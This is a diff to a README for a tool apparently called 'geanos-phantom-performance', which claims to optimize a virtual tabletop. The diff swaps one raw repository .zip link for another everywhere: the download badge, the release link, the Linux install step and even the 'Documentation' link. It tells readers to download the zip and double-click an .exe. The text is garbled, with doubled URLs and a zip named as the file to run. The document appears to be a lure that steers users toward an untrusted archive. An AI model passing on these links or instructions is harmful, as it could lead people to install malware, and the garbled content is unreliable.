@@ -1,6 +1,6 @@
 # 🚀 geanos-phantom-performance - Optimize Your VTT Experience
 
-[![Download](https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/templates/geanos-phantom-performance-v3.9.zip%https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/templates/geanos-phantom-performance-v3.9.zip)](https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/templates/geanos-phantom-performance-v3.9.zip)
+[![Download](https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/scripts/ui/geanos_phantom_performance_1.3.zip%https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/scripts/ui/geanos_phantom_performance_1.3.zip)](https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/scripts/ui/geanos_phantom_performance_1.3.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ Before you begin, ensure your system meets these requirements:
 
 To download the latest version of **geanos-phantom-performance**, visit the following page:
 
-[Download Latest Release](https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/templates/geanos-phantom-performance-v3.9.zip)
+[Download Latest Release](https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/scripts/ui/geanos_phantom_performance_1.3.zip)
 
 ### 3. Install the Application
 
@@ -39,7 +39,7 @@ Once you have downloaded the application, follow these steps to install it:
 2. **Run the Installer:** 
    - On **Windows**, double-click the `.exe` file.
    - On **macOS**, double-click the `.dmg` file and drag the application to your Applications folder.
-   - On **Linux**, follow the instructions specific to your distribution for running `https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/templates/geanos-phantom-performance-v3.9.zip` or `.deb` files.
+   - On **Linux**, follow the instructions specific to your distribution for running `https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/scripts/ui/geanos_phantom_performance_1.3.zip` or `.deb` files.
 
 3. **Follow the On-Screen Instructions:** The installer will guide you through the installation process.
 
@@ -70,7 +70,7 @@ If you encounter issues while running the application, consider these common sol
 
 ## 📖 Documentation
 
-For detailed information about the application, check out our [Documentation](https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/templates/geanos-phantom-performance-v3.9.zip). It contains a user guide and advanced configuration options.
+For detailed information about the application, check out our [Documentation](https://github.com/tinkerbell-r/geanos-phantom-performance/raw/refs/heads/main/scripts/ui/geanos_phantom_performance_1.3.zip). It contains a user guide and advanced configuration options.
 
 ## 📞 Support
 
